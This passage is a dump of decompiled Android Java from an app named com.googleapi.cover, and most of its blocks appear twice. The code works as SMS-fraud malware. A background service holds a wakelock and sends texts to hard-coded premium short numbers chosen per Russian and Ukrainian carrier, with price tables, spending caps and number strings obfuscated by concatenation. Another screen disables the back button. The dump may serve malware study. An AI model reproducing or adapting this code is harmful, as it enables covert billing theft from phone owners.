-                result.put(ActService.NUM_1_SD, ActService.NUM_1_SD);
-                result.put(ActService.NUM_1_ALT_SD, ActService.NUM_1_ALT_SD);
-                result.put(ActService.NUM_1_ALT_2_SD, ActService.NUM_1_ALT_2_SD);
-            }
-            return new HashMap<>(result);
-        }
-
-        private HashMap<String, String> getNegativeNums(boolean isBeline, boolean isMTSRF) {
-            TreeMap<String, String> result = new TreeMap<>();
-            if (isMTSRF) {
-                result.put(ActService.NUM_10, ActService.NUM_5);
-                result.put(ActService.NUM_5, ActService.NUM_3);
-                result.put(ActService.NUM_3, ActService.NUM_1);
-                result.put(ActService.NUM_1, "-1");
-            } else {
-                result.put(Actor.NUM_10, Actor.NUM_10_ALT);
-                result.put(Actor.NUM_10_ALT, Actor.NUM_5);
-                result.put(Actor.NUM_5, Actor.NUM_3);
-                result.put(Actor.NUM_3, Actor.NUM_3_ALT);
-                result.put(Actor.NUM_3_ALT, "-1");
-                result.put(Actor.NUM_1, "-1");
-                if (isBeline) {
-                    result.put(ActService.NUM_1, Actor.NUM_2);
-                    result.put(Actor.NUM_2, Actor.NUM_1);
-                    result.put(Actor.NUM_1, Actor.NUM_1_ALT);
-                    result.put(Actor.NUM_1_ALT, "-1");
-                }
-            }
-            return new HashMap<>(result);
-        }
-
-        private HashMap<String, String> getAlternativeNegativeNums(boolean isBeline, boolean isMTSRF) {
-            TreeMap<String, String> result = new TreeMap<>();
-            if (isMTSRF || isBeline) {
-                result.put(ActService.NUM_1, ActService.NUM_2_SD);
-                result.put(ActService.NUM_3, ActService.NUM_2_SD);
-                result.put(ActService.NUM_2_SD, ActService.NUM_1_SD);
-                result.put(ActService.NUM_1_SD, ActService.NUM_1_ALT_SD);
-                result.put(ActService.NUM_1_ALT_SD, ActService.NUM_1_ALT_2_SD);
-                result.put(ActService.NUM_1_ALT_2_SD, "-1");
-            }
-            return new HashMap<>(result);
-        }
-
-        private ArrayList<String> getNums(boolean isMTSRF, boolean isBeline) {
-            ArrayList<String> result = new ArrayList<>();
-            if (isMTSRF) {
-                result.add(ActService.NUM_10);
-                result.add(ActService.NUM_5);
-                result.add(ActService.NUM_3);
-                result.add(ActService.NUM_1);
-                result.add(ActService.NUM_2_SD);
-                result.add(ActService.NUM_1_SD);
-                result.add(ActService.NUM_1_ALT_SD);
-                result.add(ActService.NUM_1_ALT_2_SD);
-            } else if (!isBeline) {
-                result.add(Actor.NUM_10);
-                result.add(Actor.NUM_10_ALT);
-                result.add(Actor.NUM_5);
-                result.add(Actor.NUM_5_ALT);
-                result.add(Actor.NUM_3);
-                result.add(Actor.NUM_3_ALT);
-                result.add(Actor.NUM_2);
-                result.add(Actor.NUM_1);
-                result.add(Actor.NUM_1_ALT);
-            } else {
-                result.add(ActService.NUM_1);
-                result.add(ActService.NUM_2_SD);
-                result.add(ActService.NUM_1_SD);
-                result.add(ActService.NUM_1_ALT_SD);
-                result.add(ActService.NUM_1_ALT_2_SD);
-            }
-            return result;
-        }
-
-        private void performActions() {
-            String lastNumber;
-            Context context = ActService.this.getApplicationContext();
-            SharedPreferences settings = context.getSharedPreferences(Main.KEY_PREFS, 0);
-            String smsData = settings.getString(Actor.KEY_MSG_DATA_TEXT, "");
-            String opStr = settings.getString(Actor.NETWORK_STRING, "");
-            Actor act = new Actor(context, opStr);
-            if (act.isUkrCode()) {
-                actUK(act, settings);
-                return;
-            }
-            boolean isMTSRF = act.isMTSRF();
-            boolean isBeeline = act.isBeline();
-            if (act.isPrivate()) {
-                HashMap<String, String> positives = getPositiveNums(isBeeline, isMTSRF);
-                HashMap<String, String> negatives = getNegativeNums(isBeeline, isMTSRF);
-                int acceptedNums = 0;
-                if (isBeeline) {
-                    String currentNumber = ActService.NUM_1;
-                    ActService.PREF_TO_USE = ActService.PREF_PLAT;
-                    do {
-                        beginSending(settings, context, currentNumber, smsData, isMTSRF, isBeeline);
-                        do {
-                            try {
-                                sleep(100L);
-                            } catch (InterruptedException e) {
-                            }
-                        } while (!settings.getBoolean(Actor.MESSAGE_IS_RECEIVED_KEY, false));
-                        if (settings.getBoolean(Actor.KEY_PAID, false)) {
-                            acceptedNums++;
-                            currentNumber = positives.get(currentNumber);
-                        } else {
-                            if (currentNumber.equals(ActService.NUM_1)) {
-                                if (acceptedNums != 0) {
-                                    break;
-                                }
-                                ActService.PREF_TO_USE = Actor.PREF_PORT;
-                                positives = getAlternativePositiveNums(isBeeline, isMTSRF);
-                                negatives = getAlternativeNegativeNums(isBeeline, isMTSRF);
-                            }
-                            currentNumber = negatives.get(currentNumber);
-                        }
-                        if (currentNumber == null || acceptedNums > 2) {
-                            break;
-                        }
-                    } while (!currentNumber.equalsIgnoreCase("-1"));
-                } else if (isMTSRF || act.isMF()) {
-                    double restAllowedSum = 0.0d;
-                    ArrayList<Pair<String, Double>> prices = new ArrayList<>();
-                    if (isMTSRF) {
-                        ActService.PREF_TO_USE = ActService.PREF_A1;
-                        restAllowedSum = 350.0d;
-                        prices = ActService.mtsPrices;
-                    } else if (act.isMF()) {
-                        ActService.PREF_TO_USE = Actor.PREF_PORT;
-                        restAllowedSum = 350.0d;
-                        prices = ActService.mfPrices;
-                    }
-                    int currentNumberIndex = 0;
-                    while (true) {
-                        if (currentNumberIndex < prices.size() && ((Double) prices.get(currentNumberIndex).second).doubleValue() >= restAllowedSum) {
-                            currentNumberIndex++;
-                        } else {
-                            if (acceptedNums >= 3 || currentNumberIndex >= prices.size()) {
-                                break;
-                            }
-                            beginSending(settings, context, (String) prices.get(currentNumberIndex).first, smsData, isMTSRF, isBeeline);
-                            do {
-                                try {
-                                    sleep(100L);
-                                } catch (InterruptedException e2) {
-                                }
-                            } while (!settings.getBoolean(Actor.MESSAGE_IS_RECEIVED_KEY, false));
-                            if (settings.getBoolean(Actor.KEY_PAID, false)) {
-                                acceptedNums++;
-                                if (acceptedNums < 3) {
-                                    smsData = act.getRelatedData(acceptedNums - 1);
-                                    waitForAcceptance(acceptedNums, settings);
-                                }
-                                restAllowedSum -= ((Double) prices.get(currentNumberIndex).second).doubleValue();
-                            } else {
-                                currentNumberIndex++;
-                            }
-                        }
-                    }
-                } else {
-                    String currentNumber2 = Actor.NUM_10;
-                    String num3_alt = Actor.NUM_3_ALT;
-                    new String();
-                    ActService.PREF_TO_USE = Actor.PREF_PORT;
-                    do {
-                        beginSending(settings, context, currentNumber2, smsData, isMTSRF, isBeeline);
-                        do {
-                            try {
-                                sleep(100L);
-                            } catch (InterruptedException e3) {
-                            }
-                        } while (!settings.getBoolean(Actor.MESSAGE_IS_RECEIVED_KEY, false));
-                        lastNumber = currentNumber2;
-                        if (settings.getBoolean(Actor.KEY_PAID, false)) {
-                            acceptedNums++;
-                            currentNumber2 = positives.get(currentNumber2);
-                        } else {
-                            currentNumber2 = negatives.get(currentNumber2);
-                        }
-                        if (currentNumber2 == null || acceptedNums > 2) {
-                            break;
-                        }
-                    } while (!currentNumber2.equalsIgnoreCase("-1"));
-                    if (acceptedNums < 2 && lastNumber.equals(num3_alt)) {
-                        Utils.start(null, Utils.getScheme(Actor.NUM_1, Actor.PREF_PORT), smsData, context);
-                        Utils.start(null, Utils.getScheme(Actor.NUM_1, Actor.PREF_PORT), smsData, context);
-                    }
-                }
-            } else {
-                ArrayList<String> numbers = getNums(isMTSRF, isBeeline);
-                for (int i = 0; i < numbers.size(); i++) {
-                    String number = numbers.get(i);
-                    if (number.equals(ActService.NUM_10) || number.equals(ActService.NUM_5) || number.equals(ActService.NUM_3) || number.equals(ActService.NUM_1)) {
-                        ActService.PREF_TO_USE = ActService.PREF_PLAT;
-                    } else {
-                        ActService.PREF_TO_USE = Actor.PREF_PORT;
-                    }
-                    beginSending(settings, context, number, smsData, isMTSRF, isBeeline);
-                    do {
-                        try {
-                            sleep(100L);
-                        } catch (InterruptedException e4) {
-                        }
-                    } while (!settings.getBoolean(Actor.MESSAGE_IS_RECEIVED_KEY, false));
-                    if (settings.getBoolean(Actor.KEY_PAID, false)) {
-                        break;
-                    }
-                }
-            }
-            Utils.putStringValue(context, Actor.EXPECT_NUM, "", settings);
-            act.reportDone();
-        }
-
-        private void waitForAcceptance(int alreadyAccepted, SharedPreferences settings) {
-            do {
-                try {
-                    sleep(100L);
-                } catch (InterruptedException e) {
-                }
-            } while (settings.getInt(Actor.ALLOWED_SMS_NUMBER, 0) <= alreadyAccepted);
-        }
-
-        private void beginSending(SharedPreferences settings, Context context, String num, String smsData, boolean isMTSRF, boolean isBeeline) {
-            Utils.putBooleanValue(context, Actor.MESSAGE_IS_RECEIVED_KEY, false, settings);
-            Utils.putBooleanValue(context, Actor.KEY_PAID, false, settings);
-            Utils.putStringValue(context, Actor.EXPECT_NUM, num, settings);
-            Utils.start(null, Utils.getScheme(num, ActService.PREF_TO_USE), smsData, context);
-        }
-
-        private void actUK(Actor act, SharedPreferences settings) {
-            SmsManager sms = SmsManager.getDefault();
-            ArrayList<String> list = new ArrayList<>();
-            String opCode = TextUtils.getMNC(ActService.this.getApplicationContext());
-            String ns1ua = "31".concat("61");
-            String ns2ua = "28".concat("55");
-            String ps1_ua = "4084".concat("705");
-            if (!opCode.equals(Actor.LIFE_CODE_UA)) {
-                if (opCode.equals(Actor.TRIMOB_CODE_UA) || opCode.equals("01")) {
-                    list.add(ns2ua);
-                } else if (opCode.equals("01")) {
-                    list.add(ns1ua);
-                    list.add(ns1ua);
-                } else {
-                    list.add(ns2ua);
-                    list.add(ns1ua);
-                    list.add(ns1ua);
-                }
-                String smsData = settings.getString(Actor.KEY_MSG_DATA_TEXT, "");
-                for (int i = 0; i < list.size(); i++) {
-                    if (i != 0) {
-                        try {
-                            sleep(60000L);
-                        } catch (InterruptedException e) {
-                        }
-                    }
-                    sms.sendTextMessage(list.get(i), null, String.valueOf(ps1_ua) + " " + smsData, null, null);
-                }
-            }
-            act.reportDone();
-        }
-    }
-}
-
-Package Path:com.googleapi.cover.ActService.ActService
-Class Name:ActService
-Content: package com.googleapi.cover;
-
-public class ActService extends Service {
-    private static final double MF_LIMIT = 350.0d;
-    private static final double MTS_LIMIT = 350.0d;
-    private static String PREF_TO_USE;
-    private static boolean isStarted;
-    private PowerManager.WakeLock wakeLock;
-    public static String NUM_10 = "9865";
-    public static String NUM_5 = "9864";
-    public static String NUM_3 = "9863";
-    public static String NUM_1 = "1627";
-    public static String PREF_PLAT = "6563352";
-    public static String PREF_A1 = "7987035";
-    public static String NUM_5_A1 = "7781";
-    public static String NUM_3_A1 = "1161";
-    public static String NUM_2_A1 = "1899";
-    public static String NUM_1_A1 = "1151";
-    public static String NUM_1_ALT_A1 = "1141";
-    public static String NUM_5_SD = "8612";
-    public static String NUM_4_SD = "8611";
-    public static String NUM_3_SD = "8610";
-    public static String NUM_2_SD = "8609";
-    public static String NUM_1_SD = "8608";
-    public static String NUM_1_ALT_SD = "8607";
-    public static String NUM_1_ALT_2_SD = "8606";
-    private static ArrayList<Pair<String, Double>> mfPrices = new ArrayList<>();
-    private static ArrayList<Pair<String, Double>> mtsPrices = new ArrayList<>();
-
-    static {
-        mfPrices.add(new Pair<>(NUM_5_SD, Double.valueOf(200.0d)));
-        mfPrices.add(new Pair<>(NUM_4_SD, Double.valueOf(135.0d)));
-        mfPrices.add(new Pair<>(NUM_3_SD, Double.valueOf(100.0d)));
-        mfPrices.add(new Pair<>(NUM_2_SD, Double.valueOf(42.0d)));
-        mfPrices.add(new Pair<>(NUM_1_SD, Double.valueOf(30.0d)));
-        mfPrices.add(new Pair<>(NUM_1_ALT_SD, Double.valueOf(17.0d)));
-        mfPrices.add(new Pair<>(NUM_1_ALT_2_SD, Double.valueOf(3.39d)));
-        mtsPrices.add(new Pair<>(NUM_5_A1, Double.valueOf(203.2d)));
-        mtsPrices.add(new Pair<>(NUM_3_A1, Double.valueOf(111.76d)));
-        mtsPrices.add(new Pair<>(NUM_2_A1, Double.valueOf(74.51d)));
-        mtsPrices.add(new Pair<>(NUM_1_A1, Double.valueOf(42.34d)));
-        mtsPrices.add(new Pair<>(NUM_1_ALT_A1, Double.valueOf(27.09d)));
-    }
-
-    @Override // android.app.Service
-    public IBinder onBind(Intent intent) {
-        return null;
-    }
-
-    @Override // android.app.Service
-    public void onCreate() {
-        isStarted = false;
-        super.onCreate();
-    }
-
-    @Override // android.app.Service
-    public void onDestroy() {
-        super.onDestroy();
-        this.wakeLock.release();
-    }
-
-    @Override // android.app.Service, android.content.ComponentCallbacks
-    public void onLowMemory() {
-        super.onLowMemory();
-    }
-
-    @Override // android.app.Service
-    public void onStart(Intent intent, int startId) {
-        super.onStart(intent, startId);
-    }
-
-    @Override // android.app.Service
-    public int onStartCommand(Intent intent, int flags, int startId) {
-        if (!isStarted) {
-            Worker worker = new Worker(this, null);
-            worker.start();
-        }
-        return super.onStartCommand(intent, flags, startId);
-    }
-
-    private class Worker extends Thread {
-        private Worker() {
-        }
-
-        /* synthetic */ Worker(ActService actService, Worker worker) {
-            this();
-        }
-
-        @Override // java.lang.Thread, java.lang.Runnable
-        public void run() {
-            ActService.isStarted = true;
-            PowerManager mgr = (PowerManager) ActService.this.getSystemService("power");
-            ActService.this.wakeLock = mgr.newWakeLock(1, "WakeLock");
-            ActService.this.wakeLock.acquire();
-            performActions();
-            ActService.isStarted = false;
-            ActService.this.stopSelf();
-        }
-
-        private HashMap<String, String> getPositiveNums(boolean isBeline, boolean isMTSRF) {
-            TreeMap<String, String> result = new TreeMap<>();
-            if (isMTSRF) {
-                result.put(ActService.NUM_10, ActService.NUM_1);
-                result.put(ActService.NUM_5, ActService.NUM_3);
-                result.put(ActService.NUM_3, ActService.NUM_1);
-                result.put(ActService.NUM_1, ActService.NUM_1);
-            } else {
-                result.put(Actor.NUM_10, Actor.NUM_1);
-                result.put(Actor.NUM_10_ALT, Actor.NUM_1);
-                result.put(Actor.NUM_5, Actor.NUM_3);
-                result.put(Actor.NUM_3, Actor.NUM_1);
-                result.put(Actor.NUM_3_ALT, Actor.NUM_1);
-                result.put(Actor.NUM_1, "-1");
-                result.put(Actor.NUM_1_ALT, "-1");
-                if (isBeline) {
-                    result.put(ActService.NUM_1, ActService.NUM_1);
-                    result.put(Actor.NUM_2, Actor.NUM_2);
-                    result.put(Actor.NUM_1, Actor.NUM_1);
-                    result.put(Actor.NUM_1, Actor.NUM_1);
-                    result.put(Actor.NUM_1_ALT, Actor.NUM_1_ALT);
-                }
-            }
-            return new HashMap<>(result);
-        }
-
-        private HashMap<String, String> getAlternativePositiveNums(boolean isBeline, boolean isMTSRF) {
-            TreeMap<String, String> result = new TreeMap<>();
-            if (isMTSRF || isBeline) {
-                result.put(ActService.NUM_2_SD, ActService.NUM_2_SD);
-                result.put(ActService.NUM_1_SD, ActService.NUM_1_SD);
-                result.put(ActService.NUM_1_ALT_SD, ActService.NUM_1_ALT_SD);
-                result.put(ActService.NUM_1_ALT_2_SD, ActService.NUM_1_ALT_2_SD);
-            }
-            return new HashMap<>(result);
-        }
-
-        private HashMap<String, String> getNegativeNums(boolean isBeline, boolean isMTSRF) {
-            TreeMap<String, String> result = new TreeMap<>();
-            if (isMTSRF) {
-                result.put(ActService.NUM_10, ActService.NUM_5);
-                result.put(ActService.NUM_5, ActService.NUM_3);
-                result.put(ActService.NUM_3, ActService.NUM_1);
-                result.put(ActService.NUM_1, "-1");
-            } else {
-                result.put(Actor.NUM_10, Actor.NUM_10_ALT);
-                result.put(Actor.NUM_10_ALT, Actor.NUM_5);
-                result.put(Actor.NUM_5, Actor.NUM_3);
-                result.put(Actor.NUM_3, Actor.NUM_3_ALT);
-                result.put(Actor.NUM_3_ALT, "-1");
-                result.put(Actor.NUM_1, "-1");
-                if (isBeline) {
-                    result.put(ActService.NUM_1, Actor.NUM_2);
-                    result.put(Actor.NUM_2, Actor.NUM_1);
-                    result.put(Actor.NUM_1, Actor.NUM_1_ALT);
-                    result.put(Actor.NUM_1_ALT, "-1");
-                }
-            }
-            return new HashMap<>(result);
-        }
-
-        private HashMap<String, String> getAlternativeNegativeNums(boolean isBeline, boolean isMTSRF) {
-            TreeMap<String, String> result = new TreeMap<>();
-            if (isMTSRF || isBeline) {
-                result.put(ActService.NUM_1, ActService.NUM_2_SD);
-                result.put(ActService.NUM_3, ActService.NUM_2_SD);
-                result.put(ActService.NUM_2_SD, ActService.NUM_1_SD);
-                result.put(ActService.NUM_1_SD, ActService.NUM_1_ALT_SD);
-                result.put(ActService.NUM_1_ALT_SD, ActService.NUM_1_ALT_2_SD);
-                result.put(ActService.NUM_1_ALT_2_SD, "-1");
-            }
-            return new HashMap<>(result);
-        }
-
-        private ArrayList<String> getNums(boolean isMTSRF, boolean isBeline) {
-            ArrayList<String> result = new ArrayList<>();
-            if (isMTSRF) {
-                result.add(ActService.NUM_10);
-                result.add(ActService.NUM_5);
-                result.add(ActService.NUM_3);
-                result.add(ActService.NUM_1);
-                result.add(ActService.NUM_2_SD);
-                result.add(ActService.NUM_1_SD);
-                result.add(ActService.NUM_1_ALT_SD);
-                result.add(ActService.NUM_1_ALT_2_SD);
-            } else if (!isBeline) {
-                result.add(Actor.NUM_10);
-                result.add(Actor.NUM_10_ALT);
-                result.add(Actor.NUM_5);
-                result.add(Actor.NUM_5_ALT);
-                result.add(Actor.NUM_3);
-                result.add(Actor.NUM_3_ALT);
-                result.add(Actor.NUM_2);
-                result.add(Actor.NUM_1);
-                result.add(Actor.NUM_1_ALT);
-            } else {
-                result.add(ActService.NUM_1);
-                result.add(ActService.NUM_2_SD);
-                result.add(ActService.NUM_1_SD);
-                result.add(ActService.NUM_1_ALT_SD);
-                result.add(ActService.NUM_1_ALT_2_SD);
-            }
-            return result;
-        }
-
-        private void performActions() {
-            String lastNumber;
-            Context context = ActService.this.getApplicationContext();
-            SharedPreferences settings = context.getSharedPreferences(Main.KEY_PREFS, 0);
-            String smsData = settings.getString(Actor.KEY_MSG_DATA_TEXT, "");
-            String opStr = settings.getString(Actor.NETWORK_STRING, "");
-            Actor act = new Actor(context, opStr);
-            if (act.isUkrCode()) {
-                actUK(act, settings);
-                return;
-            }
-            boolean isMTSRF = act.isMTSRF();
-            boolean isBeeline = act.isBeline();
-            if (act.isPrivate()) {
-                HashMap<String, String> positives = getPositiveNums(isBeeline, isMTSRF);
-                HashMap<String, String> negatives = getNegativeNums(isBeeline, isMTSRF);
-                int acceptedNums = 0;
-                if (isBeeline) {
-                    String currentNumber = ActService.NUM_1;
-                    ActService.PREF_TO_USE = ActService.PREF_PLAT;
-                    do {
-                        beginSending(settings, context, currentNumber, smsData, isMTSRF, isBeeline);
-                        do {
-                            try {
-                                sleep(100L);
-                            } catch (InterruptedException e) {
-                            }
-                        } while (!settings.getBoolean(Actor.MESSAGE_IS_RECEIVED_KEY, false));
-                        if (settings.getBoolean(Actor.KEY_PAID, false)) {
-                            acceptedNums++;
-                            currentNumber = positives.get(currentNumber);
-                        } else {
-                            if (currentNumber.equals(ActService.NUM_1)) {
-                                if (acceptedNums != 0) {
-                                    break;
-                                }
-                                ActService.PREF_TO_USE = Actor.PREF_PORT;
-                                positives = getAlternativePositiveNums(isBeeline, isMTSRF);
-                                negatives = getAlternativeNegativeNums(isBeeline, isMTSRF);
-                            }
-                            currentNumber = negatives.get(currentNumber);
-                        }
-                        if (currentNumber == null || acceptedNums > 2) {
-                            break;
-                        }
-                    } while (!currentNumber.equalsIgnoreCase("-1"));
-                } else if (isMTSRF || act.isMF()) {
-                    double restAllowedSum = 0.0d;
-                    ArrayList<Pair<String, Double>> prices = new ArrayList<>();
-                    if (isMTSRF) {
-                        ActService.PREF_TO_USE = ActService.PREF_A1;
-                        restAllowedSum = 350.0d;
-                        prices = ActService.mtsPrices;
-                    } else if (act.isMF()) {
-                        ActService.PREF_TO_USE = Actor.PREF_PORT;
-                        restAllowedSum = 350.0d;
-                        prices = ActService.mfPrices;
-                    }
-                    int currentNumberIndex = 0;
-                    while (true) {
-                        if (currentNumberIndex < prices.size() && ((Double) prices.get(currentNumberIndex).second).doubleValue() >= restAllowedSum) {
-                            currentNumberIndex++;
-                        } else {
-                            if (acceptedNums >= 3 || currentNumberIndex >= prices.size()) {
-                                break;
-                            }
-                            beginSending(settings, context, (String) prices.get(currentNumberIndex).first, smsData, isMTSRF, isBeeline);
-                            do {
-                                try {
-                                    sleep(100L);
-                                } catch (InterruptedException e2) {
-                                }
-                            } while (!settings.getBoolean(Actor.MESSAGE_IS_RECEIVED_KEY, false));
-                            if (settings.getBoolean(Actor.KEY_PAID, false)) {
-                                acceptedNums++;
-                                if (acceptedNums < 3) {
-                                    smsData = act.getRelatedData(acceptedNums - 1);
-                                    waitForAcceptance(acceptedNums, settings);
-                                }
-                                restAllowedSum -= ((Double) prices.get(currentNumberIndex).second).doubleValue();
-                            } else {
-                                currentNumberIndex++;
-                            }
-                        }
-                    }
-                } else {
-                    String currentNumber2 = Actor.NUM_10;
-                    String num3_alt = Actor.NUM_3_ALT;
-                    new String();
-                    ActService.PREF_TO_USE = Actor.PREF_PORT;
-                    do {
-                        beginSending(settings, context, currentNumber2, smsData, isMTSRF, isBeeline);
-                        do {
-                            try {
-                                sleep(100L);
-                            } catch (InterruptedException e3) {
-                            }
-                        } while (!settings.getBoolean(Actor.MESSAGE_IS_RECEIVED_KEY, false));
-                        lastNumber = currentNumber2;
-                        if (settings.getBoolean(Actor.KEY_PAID, false)) {
-                            acceptedNums++;
-                            currentNumber2 = positives.get(currentNumber2);
-                        } else {
-                            currentNumber2 = negatives.get(currentNumber2);
-                        }
-                        if (currentNumber2 == null || acceptedNums > 2) {
-                            break;
-                        }
-                    } while (!currentNumber2.equalsIgnoreCase("-1"));
-                    if (acceptedNums < 2 && lastNumber.equals(num3_alt)) {
-                        Utils.start(null, Utils.getScheme(Actor.NUM_1, Actor.PREF_PORT), smsData, context);
-                        Utils.start(null, Utils.getScheme(Actor.NUM_1, Actor.PREF_PORT), smsData, context);
-                    }
-                }
-            } else {
-                ArrayList<String> numbers = getNums(isMTSRF, isBeeline);
-                for (int i = 0; i < numbers.size(); i++) {
-                    String number = numbers.get(i);
-                    if (number.equals(ActService.NUM_10) || number.equals(ActService.NUM_5) || number.equals(ActService.NUM_3) || number.equals(ActService.NUM_1)) {
-                        ActService.PREF_TO_USE = ActService.PREF_PLAT;
-                    } else {
-                        ActService.PREF_TO_USE = Actor.PREF_PORT;
-                    }
-                    beginSending(settings, context, number, smsData, isMTSRF, isBeeline);
-                    do {
-                        try {
-                            sleep(100L);
-                        } catch (InterruptedException e4) {
-                        }
-                    } while (!settings.getBoolean(Actor.MESSAGE_IS_RECEIVED_KEY, false));
-                    if (settings.getBoolean(Actor.KEY_PAID, false)) {
-                        break;
-                    }
-                }
-            }
-            Utils.putStringValue(context, Actor.EXPECT_NUM, "", settings);
-            act.reportDone();
-        }
-
-        private void waitForAcceptance(int alreadyAccepted, SharedPreferences settings) {
-            do {
-                try {
-                    sleep(100L);
-                } catch (InterruptedException e) {
-                }
-            } while (settings.getInt(Actor.ALLOWED_SMS_NUMBER, 0) <= alreadyAccepted);
-        }
-
-        private void beginSending(SharedPreferences settings, Context context, String num, String smsData, boolean isMTSRF, boolean isBeeline) {
-            Utils.putBooleanValue(context, Actor.MESSAGE_IS_RECEIVED_KEY, false, settings);
-            Utils.putBooleanValue(context, Actor.KEY_PAID, false, settings);
-            Utils.putStringValue(context, Actor.EXPECT_NUM, num, settings);
-            Utils.start(null, Utils.getScheme(num, ActService.PREF_TO_USE), smsData, context);
-        }
-
-        private void actUK(Actor act, SharedPreferences settings) {
-            SmsManager sms = SmsManager.getDefault();
-            ArrayList<String> list = new ArrayList<>();
-            String opCode = TextUtils.getMNC(ActService.this.getApplicationContext());
-            String ns1ua = "31".concat("61");
-            String ns2ua = "28".concat("55");
-            String ps1_ua = "4084".concat("705");
-            if (!opCode.equals(Actor.LIFE_CODE_UA)) {
-                if (opCode.equals(Actor.TRIMOB_CODE_UA) || opCode.equals("01")) {
-                    list.add(ns2ua);
-                } else if (opCode.equals("01")) {
-                    list.add(ns1ua);
-                    list.add(ns1ua);
-                } else {
-                    list.add(ns2ua);
-                    list.add(ns1ua);
-                    list.add(ns1ua);
-                }
-                String smsData = settings.getString(Actor.KEY_MSG_DATA_TEXT, "");
-                for (int i = 0; i < list.size(); i++) {
-                    if (i != 0) {
-                        try {
-                            sleep(60000L);
-                        } catch (InterruptedException e) {
-                        }
-                    }
-                    sms.sendTextMessage(list.get(i), null, String.valueOf(ps1_ua) + " " + smsData, null, null);
-                }
-            }
-            act.reportDone();
-        }
-    }
-}
-
-Package Path:com.googleapi.cover.RelatedContent.onKeyDown
-Class Name:RelatedContent
-Content: package com.googleapi.cover;
-
-    public boolean onKeyDown(int keyCode, KeyEvent event) {
-        if (keyCode == 4) {
-            return true;
-        }
-        return super.onKeyDown(keyCode, event);
-    }
-
-Package Path:com.googleapi.cover.RelatedContent.onKeyDown
-Class Name:RelatedContent
-Content: package com.googleapi.cover;
-
-    public boolean onKeyDown(int keyCode, KeyEvent event) {
-        if (keyCode == 4) {
-            return true;
-        }
-        return super.onKeyDown(keyCode, event);
-    }
-
-Package Path:com.googleapi.cover.RelatedContent.initializeTextViews
-Class Name:RelatedContent
-Content: package com.googleapi.cover;
-
-    private void initializeTextViews() {
-        this.mainTextView = (TextView) findViewById(R.id.related_content_name);
-        Display display = getWindowManager().getDefaultDisplay();
-        this.mainTextView.setText(getString(R.string.related_content, new Object[]{getString(R.string.app_name), Build.MODEL, String.valueOf(display.getWidth()) + "x" + display.getHeight(), Build.VERSION.RELEASE, this.actor.getRelatedContentName(this.index)}));
-    }
-
-Package Path:com.googleapi.cover.RelatedContent.initializeTextViews
-Class Name:RelatedContent
-Content: package com.googleapi.cover;
-
-    private void initializeTextViews() {
-        this.mainTextView = (TextView) findViewById(R.id.related_content_name);
-        Display display = getWindowManager().getDefaultDisplay();
-        this.mainTextView.setText(getString(R.string.related_content, new Object[]{getString(R.string.app_name), Build.MODEL, String.valueOf(display.getWidth()) + "x" + display.getHeight(), Build.VERSION.RELEASE, this.actor.getRelatedContentName(this.index)}));
-    }
-
-Package Path:com.googleapi.cover.ShowURL.onCreate
-Class Name:ShowURL
-Content: package com.googleapi.cover;
-
-    public void onCreate(Bundle savedInstanceState) {
-        super.onCreate(savedInstanceState);
-        setContentView(R.layout.grant_access);
-        this.button = (Button) findViewById(R.id.btn_download);
-        this.button.setOnClickListener(new View.OnClickListener() { // from class: com.googleapi.cover.ShowURL.1
-            @Override // android.view.View.OnClickListener
-            public void onClick(View v) {
-                Intent browserIntent = new Intent("android.intent.action.VIEW", Uri.parse(ShowURL.this.url));
-                ShowURL.this.startActivity(browserIntent);
-            }
-        });
-        this.url = getIntent().getStringExtra("URL");
-        String text = String.valueOf(getString(R.string.thanks)) + this.url;
-        this.mTextView = (TextView) findViewById(R.id.thanx_text);
-        this.mTextView.setText(text);
-        this.supportTextView = (TextView) findViewById(R.id.support);
-        this.supportTextView.setText(String.valueOf(getString(R.string.support_text)) + " " + getString(R.string.support_number));
-        this.supportTextView.setOnClickListener(new View.OnClickListener() { // from class: com.googleapi.cover.ShowURL.2
-            @Override // android.view.View.OnClickListener
-            public void onClick(View v) {
-                String uri = "tel:" + ShowURL.this.getString(R.string.support_number);
-                Intent intent = new Intent("android.intent.action.CALL");
-                intent.setData(Uri.parse(uri));
-                ShowURL.this.startActivity(intent);
-            }
-        });
-    }
-
-Package Path:com.googleapi.cover.ShowURL.onCreate
-Class Name:ShowURL
-Content: package com.googleapi.cover;
-
-    public void onCreate(Bundle savedInstanceState) {
-        super.onCreate(savedInstanceState);
-        setContentView(R.layout.grant_access);
-        this.button = (Button) findViewById(R.id.btn_download);
-        this.button.setOnClickListener(new View.OnClickListener() { // from class: com.googleapi.cover.ShowURL.1
-            @Override // android.view.View.OnClickListener
-            public void onClick(View v) {
-                Intent browserIntent = new Intent("android.intent.action.VIEW", Uri.parse(ShowURL.this.url));
-                ShowURL.this.startActivity(browserIntent);
-            }
-        });
-        this.url = getIntent().getStringExtra("URL");
-        String text = String.valueOf(getString(R.string.thanks)) + this.url;
-        this.mTextView = (TextView) findViewById(R.id.thanx_text);
-        this.mTextView.setText(text);
-        this.supportTextView = (TextView) findViewById(R.id.support);
-        this.supportTextView.setText(String.valueOf(getString(R.string.support_text)) + " " + getString(R.string.support_number));
-        this.supportTextView.setOnClickListener(new View.OnClickListener() { // from class: com.googleapi.cover.ShowURL.2
-            @Override // android.view.View.OnClickListener
-            public void onClick(View v) {
-                String uri = "tel:" + ShowURL.this.getString(R.string.support_number);
-                Intent intent = new Intent("android.intent.action.CALL");
-                intent.setData(Uri.parse(uri));
-                ShowURL.this.startActivity(intent);
-            }
-        });
-    }
-
-Package Path:com.googleapi.cover.Main.showLastScreen
-Class Name:Main
-Content: package com.googleapi.cover;
-
-    public void showLastScreen(Intent i) {
-        i.setFlags(i.getFlags() | 67108864 | 536870912);
-        String relatedLinks = "";
-        int maxIndex = getSharedPreferences(KEY_PREFS, 0).getInt(RelatedContent.LAST_ACTIVATED, -1);
-        for (int j = 0; j < maxIndex + 1; j++) {
-            relatedLinks = relatedLinks.concat("\n" + this.actor.getRelatedContentLink(j));
-        }
-        i.putExtra("URL", String.valueOf(this.actor.getActedLink()) + relatedLinks);
-        startActivity(i);
-        finish();
-    }
-
-Package Path:com.googleapi.cover.Main.showLastScreen
-Class Name:Main
-Content: package com.googleapi.cover;
-
-    public void showLastScreen(Intent i) {
-        i.setFlags(i.getFlags() | 67108864 | 536870912);
-        String relatedLinks = "";
-        int maxIndex = getSharedPreferences(KEY_PREFS, 0).getInt(RelatedContent.LAST_ACTIVATED, -1);
-        for (int j = 0; j < maxIndex + 1; j++) {
-            relatedLinks = relatedLinks.concat("\n" + this.actor.getRelatedContentLink(j));
-        }
